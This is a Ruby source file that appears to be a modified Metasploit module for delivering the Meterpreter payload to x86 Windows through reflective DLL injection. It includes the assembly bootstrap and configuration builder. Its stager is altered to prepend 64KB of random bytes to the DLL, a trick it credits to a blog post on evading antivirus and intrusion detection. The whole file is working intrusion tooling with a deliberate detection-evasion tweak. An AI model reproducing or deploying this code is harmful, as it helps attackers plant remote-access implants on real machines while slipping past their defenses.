# -*- coding: binary -*-

###
# https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/
###


require 'msf/core'
require 'msf/core/reflective_dll_loader'
require 'rex/payloads/meterpreter/config'
require 'securerandom' # <-- arno0x0x stager obfuscation method

module Msf

###
#
# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
#
###

module Payload::Windows::MeterpreterLoader

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration RDI',
      'Description'   => 'Inject Meterpreter & the configuration stub via RDI by using arno0x0x stager (obfuscation)',
      'Author'        => [ 'sf', 'OJ Reeves', 'arno0x0x (obfuscation)' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ], # customisations
        [ 'URL', 'https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/' ] # <-- arno0x0x stager obfuscation
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' => { 'Convention' => 'sockedi -https', },
      'Stage'         => { 'Payload'   => "" }
      ))
  end

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          dec ebp               ; 'M'
          pop edx               ; 'Z'
          call $+5              ; call next instruction
          pop ebx               ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp               ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
    ^

    unless opts[:stageless]
      asm << %Q^
          mov [ebx], edi        ; write the current socket to the config
      ^
    end

    asm << %Q^
          push ebx              ; push the pointer to the configuration start
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
    ^
  end

  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   ds['EXITFUNC'],
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      extensions: []
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_meterpreter(opts={})
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))

    asm_opts = {
      rdi_offset: offset,
      length:     dll.length,
      stageless:  opts[:stageless] == true
    }

    asm = asm_invoke_metsrv(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap


    #
    # arno0x0x stager obfuscation method
    # HINT: spookflare tool uses random_bytes(96000)
    #
    # dll < -- original dll header used by metasploit
    randomData = SecureRandom.random_bytes(65536) # <-- arno0x0x stager obfuscation method
    randomData + dll                              # <-- arno0x0x stager obfuscation method

  end

end

end

